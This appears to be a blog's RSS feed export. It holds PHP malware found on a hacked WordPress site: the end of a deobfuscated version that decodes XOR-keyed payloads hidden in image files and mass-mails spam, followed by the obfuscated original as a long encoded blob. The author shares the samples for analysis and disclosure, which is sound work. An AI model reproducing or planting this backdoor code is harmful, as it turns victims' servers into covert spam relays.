    $sbin = &amp;quot;&amp;quot;;
    $len  = strlen($str);
    for ($i = 0; $i &amp;lt; $len; $i += 2) {
        $sbin .= pack(&amp;quot;H*&amp;quot;, substr($str, $i, 2));
    }

    return $sbin;
}


function decode($data, $key)
{
    $out_data = &amp;quot;&amp;quot;;

    for ($i = 0; $i &amp;lt; strlen($data);) {
        for ($j = 0; $j &amp;lt; strlen($key) &amp;amp;&amp;amp; $i &amp;lt; strlen($data); $j++, $i++) {
            $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
        }
    }

    return $out_data;
}

function type1_send($config_file)
{
    $data      = file_get_contents($config_file);
    $start_pos = strpos($data, myhex2bin(&amp;quot;ffda&amp;quot;));
    if ($start_pos) {
        $start_pos += (20);
        $end_pos = strrpos($data, myhex2bin(&amp;quot;ffd9&amp;quot;));
        if ($end_pos) {
            $data = substr($data, $start_pos, $end_pos);
        } else {
            return FALSE;
        }
    } else {
        return FALSE;
    }

    $key  = $_SERVER[&#39;HTTP_HOST&#39;] . $_SERVER[&#39;REQUEST_URI&#39;];
    $data = decode($data, $key);
    $data = @unserialize($data);

    if (!$data || !isset($data[&#39;ak&#39;])) {
        return FALSE;
    }

    if ($data[&#39;ak&#39;] != &amp;quot;63847b04-bf9e-42e1-8ad8-e0d312dbddea&amp;quot;) {
        exit();
    }

    if (isset($data[&#39;c&#39;])) {
        $res[&amp;quot;r&amp;quot;][&amp;quot;c&amp;quot;] = $data[&#39;c&#39;];
        return base64_encode(serialize($res));

    }

    $good       = 0;
    $bad        = 0;
    $last_error = 0;

    foreach ($data[&#39;e&#39;] as $uid =&amp;gt; $email) {
        $theme = $data[&#39;s&#39;][array_rand($data[&#39;s&#39;])];
        $theme = alter_macros($theme);
        $theme = num_macros($theme);
        $theme = xnum_macros($theme);

        $message = $data[&#39;l&#39;];
        $message = alter_macros($message);
        $message = num_macros($message);
        $message = xnum_macros($message);
        $message = fteil_macros($message, $uid);

        $from = $data[&#39;f&#39;][array_rand($data[&#39;f&#39;])];
        $from = alter_macros($from);
        $from = num_macros($from);
        $from = xnum_macros($from);

        if (strstr($from, &amp;quot;[CUSTOM]&amp;quot;) == FALSE) {
            $from = from_host($from);
        } else {
            $from = str_replace(&amp;quot;[CUSTOM]&amp;quot;, &amp;quot;&amp;quot;, $from);
        }

        $from_email = explode(&amp;quot;&amp;lt;&amp;quot;, $from);
        $from_email = explode(&amp;quot;&amp;gt;&amp;quot;, $from_email[1]);
        $from_name  = explode(&amp;quot;\&amp;quot;&amp;quot;, $from);

        $last_error = sendSmtpMail($from_email[0], $from_name[1], $email, $theme, $message, $data[&#39;lt&#39;], $config_file);

        if ($last_error === 0) {
            $good++;
        } else {
            $bad++;
            $good = count($data[&#39;e&#39;]) - $bad;
        }
    }

    $res[&amp;quot;r&amp;quot;][&amp;quot;e&amp;quot;] = $last_error === FALSE ? 0 : $last_error;
    $res[&amp;quot;r&amp;quot;][&amp;quot;g&amp;quot;] = $good;
    $res[&amp;quot;r&amp;quot;][&amp;quot;b&amp;quot;] = $bad;

    return base64_encode(serialize($res));
}
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Obfuscated code from the WordPress hack</title>
      <link>http://sa.muel.be/addendum/2015/obfuscated-code-from-the-wordpress-hack/</link>
      <pubDate>Sat, 27 Jun 2015 18:13:06 +0200</pubDate>
      <author>s@muel.be (Samuel Debruyn)</author>
      <guid>http://sa.muel.be/addendum/2015/obfuscated-code-from-the-wordpress-hack/</guid>
      <description>&lt;p&gt;This page is part of the blogpost &lt;a href=&#34;http://sa.muel.be/2015/about-that-time-i-dealt-with-a-bunch-of-hackers-on-a-wordpress/&#34;&gt;About that time I dealt with a bunch of hackers on a WordPress&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The following is an example of the code I found when one of the WordPress installations I managed was hacked. You can find the &lt;a href=&#34;http://sa.muel.be/addendum/2015/deobfuscated-code-from-the-wordpress-hack/&#34;&gt;deobfuscated version right over here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
function yxsp($bzgsgbglpr, $fhuazfo){$r = &#39;&#39;; for($i=0; $i &amp;lt; strlen($bzgsgbglpr); $i++){$r .= isset($fhuazfo[$bzgsgbglpr[$i]]) ? $fhuazfo[$bzgsgbglpr[$i]] : $bzgsgbglpr[$i];}
$indkcf=&amp;quot;base64_decode&amp;quot;;return $indkcf($r);}
$cwhs = &#39;5t3D5BFTVBeDhn9yJQhtJQ6sMesZvKffBRFnSPVnSPpqSL8eBRFny&#39;.
&#39;L3qBkw96v616ApKvKffBRFnSPVnSPpqSfQFyRJnBgnLJn6qBkw96v60OAxjO&#39;.
&#39;v7zlALXHzDh5t3D6tQoxWJNMvJuSgQkQfQktIc6QnJeBR8uJf9kQgnkJLQLBgViSXccMkfMvBpMvef&#39;.
&#39;fBRFnSPVnSPpqknJSSn93BgViSPcESfJnJn9byR6qBkw96v60OAxjOv7zlALXHzDhues9vKs&#39;.
&#39;sVX8sxGFPcvKfBgVhyLQyMkfMazDhV49IVtnA5vKfBgVhyLQy6bnT6vJUVBfKiy7KhbVsrbSsvKPZvKfh5t3D6BFgxqE1xIK&#39;.
&#39;fV4PpVQpqr4noVkcclvwXl4szVI6sMeDhvBpMvefhhbVsrbQj3tRP6CgK3t0gVBhurtnAx49TMvJ45t0PtIcj3tRPhR&#39;.
&#39;gsHzDhveffV4PpVtN8rtSKikEjctRurtnAx49TMvJ45t0Pr4noVkfZvKfhvkJ45t0Pr4noVkw96W8jctRurtnAx49TMvJ45&#39;.
&#39;t0Pr4noVkfZvKfhvkJuJfPOJQFrhboPaQRr64N8rtSXBkw96vJ45t0Pr&#39;.
&#39;4noVypMveP9vKP9vqgMves4ctNAcbP1rXEAcBFgrmRuxGJI5BEucbnqxI&#39;.
&#39;KfcbQ7cvfMazDK6vwKhWJPaWeKikETcWhsxn9g3tcTMvJgVB8glvwqibL+h&#39;.
&#39;IfZvKDK6vwKhWJPaWeKikETcWhux4QzrbnAVkKXibLK5WhPVARx6X6p6&#39;.
&#39;vhr6v6p6vJgVB8gMypM6vwK6vJgVB8g6CgKxGJIBGhPxb083mSD6Az13y7X&#39;.
&#39;lvwX6XzKhWJPaWesHzDK6vwKhWJPaWeKikETcWhux4QzrbnAVkKXBv6+6XzK6XEc6v&#39;.
&#39;6p6vJgVB8gMypMvXwK6vEIVBJRx47KhWJPaWeZvqgMv4VRr4Fg5t&#39;.
&#39;9j6bPTBmPzMvJTcW6s6WpM6vEIVBJRx47KxWhPVR9o3BJA5vKXlR7DtTLoHQR2tTLoHQRrOvgNBBz0tTwo&#39;.
&#39;HQRrOvgNBBzItTwoFnRrOvgNBBzIFQpzlyQcMk8xlX8rOvgNBB0rOkgNBQpzlyPcuCnrOv&#39;.
&#39;gNBQpzlyPcuChrOvggBQpzlyPcuC6RtTwoFQgsMBpTuke16XzfxGJIMypMueDMVqQj3GJsrm&#39;.
&#39;7KVqh1rQ9DrGFgMvJArmNgVtNgMesZvKDK6vwKhb81xGeKikEzx4QqBGh&#39;.
&#39;Pxb083mSDhI9aMWcGcG04cWwsBv715kxphIxpevJuSgQkQfQktIc6QnJeBg8iSReqBkfZvKDK6vwK5t3KMbPTBmPzMvJDr&#39;.
&#39;GFgMkfM6vwK6WpM6vwK6vwK6vEIVBJRx47KhbF1rqJPrqeZvXwK6vE9vXwK&#39;.
&#39;6vwM6vwK6vJgrmoPrqOKikEPaWEprmJPMvhw6XzKhbF1rqJPrqesHzDM6vwK6vJArmNgVtNg6CgKhWJ15mQjxRpzBkwj6vh&#39;.
&#39;w6Xwj6vJDrGFg6v7K6A7XHzDM6vwK6WhPcWQIrXwf3m9jcbQjcCpMueDMVqQj3GJsrm7K3t0gVBhurtnAx49TMvJ&#39;.
&#39;ArmNgVtNgMesZvXwK6vEzx4QqBmR8cbFDBmnprvKq6GpDlXDsukFQ5kxp6vJArmNgVtNglvwfrtng3m8P&#39;.
&#39;xIfZvKDK6vwKV49IMvJs6CgKOCpKhbfKivEArGQjcvKfrtng3m8PxRp0B&#39;.
&#39;kfZ6vJsMIpsvXwK6vEZvKDK6vwK6vwK6vJjxIw96bQ7xb01VbSD6qzXlvwfrtng3m8PxRp0BQpf5QgsHzDK6vwK6vwK&#39;.
&#39;6vJAOXw96bF1ctNgMvJjxIfZvXwK6vwK6vwKhWh8r4eKikEI3tNfMCwp6vKf3T6Klkw0MkfZvXwK6vwK6vwKhbF1rqJPr&#39;.
&#39;qeKikETcWhux4QzrbnAVkKXaI6jhbR8cbFDVBFrOQRrhbPclXh96XzKhbNTtIJI3tNfBkzKhbF1rqJPrqesHzDK&#39;.
&#39;6vwKueDK6vwKx4QgcBhj6vJArmNgVtNgHzs9vKDMVqQj3GJsrm7KabNRrQ9o3tFIrGODhbF1rqJPrqesvqpM6&#39;.
&#39;vwK6WEIVtcurtng3m8u3t0pMvxABnoHQSRxlk8rtTsf5tcscCscBkpsBngAhIzKhbF1rqJPrqep6vJo3BJA5bQTMypMvXwK6v&#39;.
&#39;E4rG6DhbfKikwzHIwf5kw26bF1ctNgMvJo3BJA5bQTtTEcMypKhbfUMIfM6vwK6WpM6vwK6vw&#39;.
&#39;K6vwfrqQo6CgKhbR8cbFDVBFrOQRrhbPcHzDK6vwK6vwK6vJo5t7KikEzrGxDOywp6vJjctgKlkw0MypM6vwK6vwK6vw&#39;.
&#39;frtn76CgKxb9GMCLzlvwfrqQoMkwo6CLZvKDK6vwK6vwK6vJI3tNf6CgKx4njVvKfrtPjl&#39;.
&#39;vwfrtn7MypM6vwK6vwK6vwf3m9jcbQjcvw96WFgxP9IVBEp3tFPMvJo3&#39;.
&#39;BJA5bQTtTEctIJsBkzKhWh8r4ep6vJArmNgVtNgMypM6vwK6WgM6vwK6WhPcWQIrXwf3m9jcbQjc&#39;.
&#39;CpMueDMVqQj3GJsrm7KrqQoBmR83Gh1xIKf3m9jcbQjcvfMazDK6vwK&#39;.
&#39;xWhPVR9o3BJA5n98rbzDhIFxtRhEyfJxlk8rtTsf5tcscCscBkp&#39;.
&#39;sBvgDtRpdVbPq5BedBQgUMQ0c6Ixp6vJArmNgVtNglvwfrtng3m8PxI&#39;.
&#39;fZvKDK6vwKV49IMvJs6CgKOCpKhbfKivEArGQjcvKfrtng3m8PxRpzBkfZ6vJsMIpsvXwK6vEZvXwK6vw&#39;.
&#39;K6vwKhbRsrXw96vJo3BJA5bQTtTnctIJsBypM6vwK6vwK6vwfrtn76CgKhbR8cbFDVBFrOPRrhbPcHzDK6vw&#39;.
&#39;K6vwK6vJI3tNf6CgKx4njVvKfrtPjlvwfrtn7MypM6vwK6vwK6vwf3&#39;.
&#39;m9jcbQjcvw96WFgxP9IVBEp3tFPMvJo3BJA5bQTtTEctIJsBkzKhWh&#39;.
&#39;8r4ep6vJArmNgVtNgMypM6vwK6WgM6vwK6WhPcWQIrXwf3m9jcbQjcCpMueDMv4VRr4Fg5t9&#39;.
&#39;j6bVgVtPpBmR83Gh1xIKf3m9jcbQjcvzKhbVgVtPpMesZ6vwK6wDK&#39;.
&#39;6vwKx4QgcBhj6WFgxP9IVBEp3tFPMvhrJPJnkS0c6XzKhbVgVtPplvwf3m9jcbQjcvfZvqgMv4&#39;.
&#39;Fp3BFT6nE6SLR85t0PxKsZvXwK6vEzcthp5tOKhnVPxqFsrm7KikwqF&#39;.
&#39;k7IlAfqHzDM6vwK6WER340s3IwfSWhsrGhscWfKikwTHzDM6vwK6WER340s3Iwfem88xPFPcvw96vcsxm2oHCKRHkg0&#39;.
&#39;hTpMvXwK6vEzcthp5tOKhLF1rqJPrqJSaBEP6CgKhGJPaWe1xb08&#39;.
&#39;5t7qHzDM6vwK6WER340s3IwfJtNArmJsr4xKikwqHbhscvxZvKDK6vwKxWQXrbPA6vJnxqh1xfPjV42KikwqhTpMvXwK&#39;.
&#39;6vEzcthp5tOKhLVIrmgKikwqx491cLEprmF8rb81xGeqHzDM6vwK6WER340s3IwfJq&#39;.
&#39;h1rSN8rtSKikwqS491cvEQxmQIhTpMvXwK6vEzcthp5tOKhnFPr4JPxXw96vxqHzDM6vwK6WER340s3Iw&#39;.
&#39;fS4QgcBhjSbng5vw96vxqHzDM6vwK6WER340s3IwfSGQX54QAcvw96vxqHzDM6vwK6WER&#39;.
&#39;340s3Iwfe49fakw96vxqHzDM6vwK6WER340s3Iwfet0ge49fakw96vxqHzDM6vwK6WER340s3IwfktF8rvw96vxqHzDM6vwK6WE&#39;.
&#39;IrGJP3GJPVvwfySPFJSh1VWfKikwqhTpMvXwK6vEzx49gVtFgVteKhLRhySQ6VtnfVB6KikwqhTpMvXwK6vEzx49gVtFgVteKhbR&#39;.
&#39;85t06VtnfVB6KikwqhTpMvXwK6vEzcthp5tOKhnc1x4JBx4nz6CgKOCpMvXwK6vEzcthp5tOKhLR85t0P&#39;.
&#39;xXw96vco3tPphTpMvXwK6vEzcthp5tOKhnFPr4Jo3tPp6CgKhI&#39;.
&#39;9RxG61xmhsrX9TVtNfrtnsrvxZvKDK6vwKxWQXrbPA6vJQxmQyVtNfrtn&#39;.
&#39;srL9zcbP1rqOKikEgxqQPHzDM6vwK6WER340s3IwfSb0RVmPjJbP&#39;.
&#39;I6CgKhIxZvKDK6vwKxWQXrbPA6vJCrmN45BhoS4Q8VbPjVRJ16CgKhIxZvKDK6vwKxWQXrbPA6vJ6rGFgr4noVkw9&#39;.
&#39;6vxqHzDM6vwK6WER340s3IwfytQTxmnqVSPL6CgKhIxZvKDK6vwKx&#39;.
&#39;WQXrbPA6vJFVBFT3tcPJbngVkw96vxqHzDM6vwK6WER340s3Iwfkb9Tcvw96vcprmF8r&#39;.
&#39;b81xGeqHzDM6vwK6WER340s3IwfSb9Icvw96C6RHzDM6vwK6WER340s3Iwf&#39;.
&#39;kbQprIw96vxqHzDM6vwK6WER340s3IwfSgRSSnFP3GQIVkw96vxqHzDM6vwK6WER340s3IwfSgRSSLnRcbKKikE43t&#39;.
&#39;0TVypMvXwK6vEzcthp5tOKhnQTVBhj3tRP6CgKhIxZvKDK6vwKxWQXrbPA6vJe3BF&#39;.
&#39;Tcm9IVvw96vxqHzDM6vwK6WER340s3IwfeBQg5nJNxbSKikwqhTpMvXwK6vEzcthp5tOKhnhP3t0o6CgK&#39;.
&#39;hIxZvKDK6vwKxWQXrbPA6vJBrGhUxGJ8cbP1rXw96vxqHzDM6vwK6WER340s3IwfQbPoVt9Rcvw&#39;.
&#39;96COzOCpMvXwK6vEzcthp5tOKhnFFQnELVthRVIw96CwZvKDK6vwKxWQXrbPA6vJLVthRVm9RcWERcvw96vcP3m81hTp&#39;.
&#39;MvXwK6vEzcthp5tOKhnFFQnElVtQzet0sc4SKikE43t0TVypMvXwK6vEzcthp&#39;.
&#39;5tOKhnFsr4cpVQJ16CgKV4npxmSZvKDK6vwKxWQXrbPA6vJy5tNqrbQSrgn&#39;.
&#39;Ix4nN6CgK3BhI3BfDMypMvXwK6vEzcthp5tOKhbJ1BGVPxqwKikE43t0TVyp&#39;.
&#39;MvXwK6vEzcthp5tOKhLnprb9GJtRzcWfKikE43t0TVypMvXwK6vEzcthp5tOKhL0n6CgK6P0j&#39;.
&#39;6ApMvXwK6vEzcthp5tOKhLJlkSRuxmQpVtFgrG6KikwqhTpMvXwK6vEzcthp5tOKhLJlkSRu5tJPrqJscWfKikw&#39;.
&#39;qhTpMvXwK6vEzcthp5tOKhLJlkSRuxbnTxGEDx4nTVkw96vxqHzDM6vwK6WER340s3IwfJLoh&#39;.
&#39;yQ9frmR85t7KikwqhTpMvXwK6vEzcthp5tOKhLJlkSRuxWhsc4ngVkw96vxqHzDM6vwK6WER340&#39;.
&#39;s3Iwf3tFg5t9jBmVRr4Fg5t9j6CgKhIxZvKDK6vwKxWQXrbPA6vJ3ytnsrbQI6CgKhIxZvKDK6vwKxWh1cbQAcbQf&#39;.
&#39;6vJTrBJz6CgKrqQprCpMvXwK6vEzx49gVtFgVteKhWJ16CgK3BhI3&#39;.
&#39;BfDMypMvXwK6vEzx49gVtFgVteKhbFA6CgK3BhI3BfDMypMvXwK6vEzx49gVt&#39;.
&#39;FgVteKhbhA3Iw96bnIx4nNMvfZvKDK6vwKxWh1cbQAcbQf6vJkVBEpaQJ16CgK3B&#39;.
&#39;hI3BfDMypMvXwK6vEzx49gVtFgVteKhbnprn9IVtFsxbPPrqJT6CgK3BhI3BfDMypMvXwK6vEzx49gVtFgVteKhbngcbnA5&#39;.
&#39;bRPrqeKikE8xqh8akKsHzDM6vwK6WEIrGJP3GJPVvwfeGQTcb9okbQ8VbQI6CgK3BhI3BfDMypM&#39;.
&#39;vXwK6vEzx49gVtFgVteKhb08xGJFVBFT3tcPkSeKikwqhTpMvXwK6vEzx49gVtFgVteKhbRPxGF8VmQucWPzVkw96vxqH&#39;.
&#39;zDM6vwK6WEIrGJP3GJPVvwf349Rr4J8xqfKikE8xqh8akKsHzDM6vwK6WEIrGJP3&#39;.
&#39;GJPVvwfrbnjVGQ8VmSKikE8xqh8akKsHzDM6vwK6WEIrGJP3GJPVvwfVBhIrGhu3m9RrqeKikwzHzDM6vwK6WEIrGJP3&#39;.
&#39;GJPVvwfxmPqrP9AVBhgBmVsrbSKikwqhTpMvXwK6vEzx49gVtFgVteKhWFsVm&#39;.
&#39;Nu5mQNBmVsrbSKikwqhTpMvXwK6vEzx49gVtFgVteKhWFsVmNu5mQNBGE8xGOKikwqhTpMvX&#39;.
&#39;wK6vEzx49gVtFgVteKhbQ73mQzcbP1rqOKikE43t0TVypMvXwK6vEArmNTcvEyQL9eBgRnSRFEJgSKikwzH&#39;.
&#39;zDM6vwK6bF1rqFg6nFSyREueg9HQLPHQSSKikw0HzDM6vwK6bF1rqFg6nF&#39;.
&#39;SyREueRhhQLPCeSzKikwIHzDM6vwK6bF1rqFg6LFkyL3KikwXBWhxrX6ZvKDK6vwKxWQXrbPA6bVRr4Fg&#39;.
&#39;5t9j6n9u3m9jxGJIctFgMvJPabFPxWJsrmNT6CgKV4npxmSsvXwK6vEZvXwK6vwK6vwKhWJD5BOoi4Q7&#39;.
&#39;3mQzcbP1rqOKikwD3491rbQ8rXffVB8AVBEg5t9jxTpM6vwK6WgMvXwK6vEzct&#39;.
&#39;hp5tOKVqQj3GJsrm7KBR9fVBFgxqQAcvKsvXwK6vEZvKDK6vwKueDM6vwK6WEI5BV8cbSKVqQj3GJsrm7Krtnsr&#39;.
&#39;nE8xGFg5WhRMvJgrIzKhWFR34sP3Gep6vJXrmJNlvwf5bQ8VbQIlvwfxbnI3tRTMe&#39;.
&#39;DK6vwKazDK6vwK6vwK6v21em8P3mpKrGVPx4013tJsr4xKrm3KrtnsrvE4ctNAcbP1rXEgrIE8c49sVvEfrGQXrbSoVtNArmJsr4&#39;.
&#39;xM6vwK6vwK6vEsVXwD5tNsBmcPcvKqrthTcWhsr4xjVqQj3R91c4QIrb98Vvxs6v3KOkfKazDK6vwK6vwK6vwK6vwfxGQ&#39;.
&#39;X54QAcvw96vJg5bPTlyNTVtFRx4Q6VtnfVB6DhWFR34sP3GesHzDK6vwK6vwK6WgKVt0TVkEZvXwK6vwK6vwK6vwK6vJTc&#39;.
&#39;thYVtFg6CgKhWJD5BOoi4Qj3m9fVS8P3tJPxXKfcb8sxIg+xmQAcBhPkbQ8VbQIMvJTcthYVtFgMkfZvXwK6vwK6&#39;.
&#39;vwKueDK6vwK6vwK6bP46v8sr4PuVmQgMvcT3tVPBmR1VbSqMkE2uvw8MvJg5bPTlyNQxmQyVtNfrtnsrL9zcbP1&#39;.
&#39;rqOsMkEZvXwK6vwK6vwK6vwK6vJIVBFRrWeKikEwrtnsrvKfcb2p6vJ&#39;.
&#39;TcthYVtFglvwf349fakzKhb8P3tJPxXfZvXwK6vwK6vwKukEPrWFP6W&#39;.
&#39;pM6vwK6vwK6vwK6vwKhWhPxGQpcvw96LEo3tPpMvJgrIzKhWFR34sP3Gep6vJXrmJNlvwf5bQ8VbQIlvw&#39;.
&#39;fxbnI3tRTMypM6vwK6vwK6vE9vXwK6vwK6vwKx4QgcBhj6vJIVBFRrWeZvXwK6v&#39;.
&#39;E9vKDK6vwKxWh1cbQAcbQf6bVRr4Fg5t9j6bQfVthRVIKfxGJIMeDK6vwKazDK6vwK6vwK6bP46vKfcb8sxIg+SgRSSLJ&#39;.
&#39;P3qQq6Cz96Cws6WpM6vwK6vwK6vwK6vwKx4QgcBhjHzDK6vwK6vwK6WgM6vwK6v&#39;.
&#39;wK6vw1lgnmrmPf6bFp3BFD6WcscbKK3qQsrWeo5t7KVqQj3GJsrm7Kr4noVBOM6&#39;.
&#39;vwK6vwK6vEsVXwD6tPjBmnIx4nNMvJg5bPTlyNLVthRVm9RcWERcvzK3BhI3BfDhmQIx49IBm01VIxp6vcDcbRphIzKhmQ&#39;.
&#39;A5b2qMkfK3tNf6bPTBmF8rb08340PMvJg5bPTlyNLVthRVm9RcWERcvfs6WpM6vwK6vwK6vwK6vwK3mnprn9&#39;.
&#39;RxmQIBmVRr4ODhWJD5BOoifJP3qQqrGQgxWQglvwfxGJIlvwfcb8sxIg+SgRSSLJP3qQqMypM6vwK6&#39;.
&#39;vwK6vwK6vwKx4QgcBhjHzDK6vwK6vwK6WgM6vwK6vwK6vETcmPg3mKK&#39;.
&#39;MvJg5bPTlyNLVthRVm9RcWERcvfKazDK6vwK6vwK6vwK6vEA3BFP6vcPxqh1xP9prmxqHKDK6vwK6vwK6vwK6v&#39;.
&#39;wK6vwKlI9Lrm7qcvE1cBJzcBep6bsRxGeKrb9qvXwK6vwK6vwK6vwK6vwK6vEPxqh1xP9prmxDhWFgxXfZv&#39;.
&#39;XwK6vwK6vwK6vwK6vwK6vEXx4Q85TpM6vwK6vwK6vwK6vwK3mnTVkwq5W&#39;.
&#39;JorvxdvXwK6vwK6vwK6vwK6vwK6vw1lgFpVtnjxIERxvE1cBJzcBeK3kEX5BeKV49I6bLK34QgcbQI6b0&#39;.
&#39;1rmosr4xp6L8SySzoxmn4VkE1cBJzcBeM6vwK6vwK6vwK6vwK6vwK6bQA5b2K5WJorbQjcbPg5tQTMwD&#39;.
&#39;K6vwK6vwK6vwK6vwK6vwK6vwK6WEIVtcux4QzrbnAVkKqlRoxxP0jBkp1hIzKhIxp6v&#39;.
&#39;JTcW6slwDK6vwK6vwK6vwK6vwK6vwK6vwK6LQHQn9JQS9SJQOpvXwK6vwK6vwK6vwK6vwK6vwK6vwKhRQSJXg7hzDK6vwK6vw&#39;.
&#39;K6vwK6vwK6vwKMeDK6vwK6vwK6vwK6vwK6vwKlXwXibhIiP0j6ApM6vwK6vwK6vwK6vwK6vwK6bhIVtn&#39;.
&#39;UHzDK6vwK6vwK6vwK6vEA3BFP6vcP3m81hTDM6vwK6vwK6vwK6vwKVbQ43BQpcCDM6vwK6vwK6vwK6vwK6vw&#39;.
&#39;K6v21y49Irtnp5BsP6b0sr4SK3qhP3toTvXwK6vwK6vwK6vwK6vwK6vwfxGJI6CgK&#39;.
&#39;xWhPVR9IVBEp3tFPMvx1Mn0IBbN2BWh2Bb7slmRThIzK6P0j6XzKhWFgxXfZvXwK6vwK6vwK6vwK6vwK6vEP3m816bcoVbngVkK&#39;.
&#39;qtkRolteKkCssHqOqMkwj6vhxcv6KlXETcWhux4QzrbnAVkKM6vwK6vwK6vwK6vwK6vwK6vwK6vwXBb7XlwDK6vwK6vwK6&#39;.
&#39;vwK6vwK6vwK6vwK6vhxrXwK6vwK6vwK6vwK6vwK6vwK6vExcvwK6vwK6vwK6vwK6vwK6vwK6v6pvXwK6vwK6vwK6vwK6vwK6vwK&#39;.
&#39;6vwKcWhsrkKfxGJIMeDK6vwK6vwK6vwK6vwK6vwKMkwj6vhxrX6ZvXwK6vwK6vwKueDK6vwKueDM6vw&#39;.
&#39;K6WER340s3IE4ctNAcbP1rXEsxg8SySzDhbPTkWJorvw96WJIctSsvXw&#39;.
&#39;K6vEZvXwK6vwK6vwK5t3KMvJsxg8grtzs6WpM6vwK6vwK6vwK6vwKhWJD5BOoifF1rqJPrqJSaBEP6CgKhGJPa&#39;.
&#39;We15WJorvxZvXwK6vwK6vwKukEPrWFP6WpM6vwK6vwK6vwK6vwKhWJD5BOoifF1rqJPrqJSaBEP6CgKhGJPaWe1xb085t7qHzDK&#39;.
&#39;6vwK6vwK6WgM6vwK6WgMvXwK6vEzcthp5tOKVqQj3GJsrm7K5BFyyQJeMvfM6vwK6WpM6vwK6&#39;.
&#39;vwK6vwfcb8sxIg+ytnsrbQI6CgKhGFocWwqHzDK6vwKueDM6vwK6WER340s3IE4ctNAcbP1rXEsxgR85tzD&#39;.
&#39;MeDK6vwKazDK6vwK6vwK6vJg5bPTlyNF3tPpVB6KikwqrtnsrvxZvXwK6vE9vKDK6vwKxWQXrbPA6bVRr&#39;.
&#39;4Fg5t9j6bPTSmQjVbR85tzDMeDK6vwKazDK6vwK6vwK6vJsr4Pu&#39;.
&#39;xmQjVbR85t0uxbng5vw96bPj5Q9qVBeDhGFPr4Jo3tPpBGE8cbK&#39;.
&#39;qMypMvXwK6vwK6vwK5t3KMvnTcWhsxGJIMvJsr4PuxmQjVbR85t0uxbng5vzKhGFPr4Jo3tPphIfs6WpM6vwK6vwK&#39;.
&#39;6vwK6vwKhWJD5BOoiPFPr4Jo3tPp6CgKhI9RxG61xmhsrX9TVtNfrtnsrvxZvXwK6vwK6vwKukEPrWFP6WpM6vwK6v&#39;.
&#39;wK6vwK6vwKhWJD5BOoiPFPr4Jo3tPp6CgKhbPj5Q9TVtNfrtnsrn9z3BJDHzDK6vwK6vwK6WgM6vwK6vwK6vwfcb8sxIg+ytnsrb&#39;.
&#39;QI6CgKhGFPr4Jo3tPphTpM6vwK6WgMvXwK6vEzcthp5tOKVqQj&#39;.
&#39;3GJsrm7K5BFJrtnsrvKsvXwK6vEZvXwK6vwK6vwKhbPj5Q9TVtNfrtnsrn9z3BJD6CgK5tNsBmcPcvKqxmQjVbR&#39;.
&#39;85t0uxbng5vxsHzDM6vwK6vwK6vEsVXwD6BFgx4PTcW6DhbPj5Q9TVtNfrt&#39;.
&#39;nsrn9z3BJDlvwqxtR85tzqMkfKazDK6vwK6vwK6vwK6vwfcb8sxIg+Sm&#39;.
&#39;QjVbR85tzKikwqlGV8xX90rtnsrv9X5t71xtR85tzo5tNYVtFghTpM6vwK6vwK6vE96bQpxmSKazDK6vwK6vwK6vwK6vw&#39;.
&#39;fcb8sxIg+SmQjVbR85tzKikwf5tNsBGFPr4Jo3tPpBGE8cbKZvXwK6vwK6vwK&#39;.
&#39;ueDK6vwK6vwK6vJg5bPTlyNF3tPpVB6KikwqxtR85tzqHzDK6vwKueDM6vwK6WER340s3IE4ctNAcb&#39;.
&#39;P1rXE8VbJEVbJIVBFTMvJ8VbJIVBFTlvwfr4noVkw96vxqMeDK6vwKa&#39;.
&#39;zDK6vwK6vwK6WhPcWQIrXwfcb8sxIg+3tJfetNEVbJIVBFTMvcgrIxp6vJ8VbJIVBFTlvwfr4noVkfZ&#39;.
&#39;vXwK6vE9vKDK6vwKxWQXrbPA6bVRr4Fg5t9j6bnfVLFCMvJ8VbJIVBFTlvwfr4noVkw96vxqMeDK6vwKazDK6vwK6v&#39;.
&#39;wK6WhPcWQIrXwfcb8sxIg+3tJfetNEVbJIVBFTMvcA3Ixp6vJ8V&#39;.
&#39;bJIVBFTlvwfr4noVkfZvXwK6vE9vKDK6vwKxWQXrbPA6bVRr4Fg5t9j6bnfVLhCeIKf3tJfx4QTxIzKh&#39;.
&#39;bN8rtSKikwqhIfM6vwK6WpM6vwK6vwK6vEIVBJRx47KhWJD5BOoi4nfVLnjetJfx4Q&#39;.
&#39;TxIKq34FAhIzKhbnfVWhPxGOp6vJj3tRPMypM6vwK6WgMvXwK6vEzcthp&#39;.
&#39;5tOKVqQj3GJsrm7K3tJfS4QzrWPSrIKf3tJfx4QTxIzKhbN8rtSKikwqhIfM6vwK6WpM&#39;.
&#39;6vwK6vwK6vEIVBJRx47KhWJD5BOoi4nfVLnjetJfx4QTxIKqS4QzrWfoQb2qlvw&#39;.
&#39;f3tJfx4QTxIzKhbN8rtSsHzDK6vwKueDM6vwK6WEIrGJP3GJPVvE4ctNAcbP1rXE8VbJErfnfVWhPxGODhbosr4ep6vJ&#39;.
&#39;8VbJIVBFTlvwfr4noVkw96vxqMeDK6vwKazDK6vwK6vwK6bP46v&#39;.
&#39;K8xWhPVR9o3BJA5vKqlR7Dcb923mF234FAunhPxb0NlQJ1Mke1hIzKhbosr4esMkEZvXwK6vwK6vwK6vwK6&#39;.
&#39;vJg5bPTlyNTVBJnxqh1xXKfcb8sxIg+rbnjVIKqktNm3t0sVvEIVtFsxbPPrqeK3BhI3BfqMkwj6vxd6vx&#39;.
&#39;KlXwf5mPjVvfZvXwK6vwK6vwK6vwK6vJg5bPTlyNPVbQXctxDhWJD5BOoi408r4xDhgPjc4np5teKx4QA5B&#39;.
&#39;EsVtNg6bnIx4nNhIfKlXwqHXwq6v7Khbosr4esHzDK6vwK6vwK6vwK6vEsVXwDhWJD5BOoi4Q&#39;.
&#39;73mQzcbP1rqOs6WpM6vwK6vwK6vwK6vwK6vwK6WJDx49G6bNPcIEz5WEo3&#39;.
&#39;tPpVBhnabFPxWJsrm7DhgPjc4np5teKx4QA5BEsVtNg6bnIx4nNHXwq6v7Khbosr4esHzDK6vwK6vwK6vwK6vE&#39;.
&#39;9vXwK6vwK6vwK6vwK6WhPcWQIrXE43t0TVypM6vwK6vwK6vE9vXwK6vwK6vwKhbnfVWhPxGOKikEgx4PoMvJ8VbJIVBFTMypM&#39;.
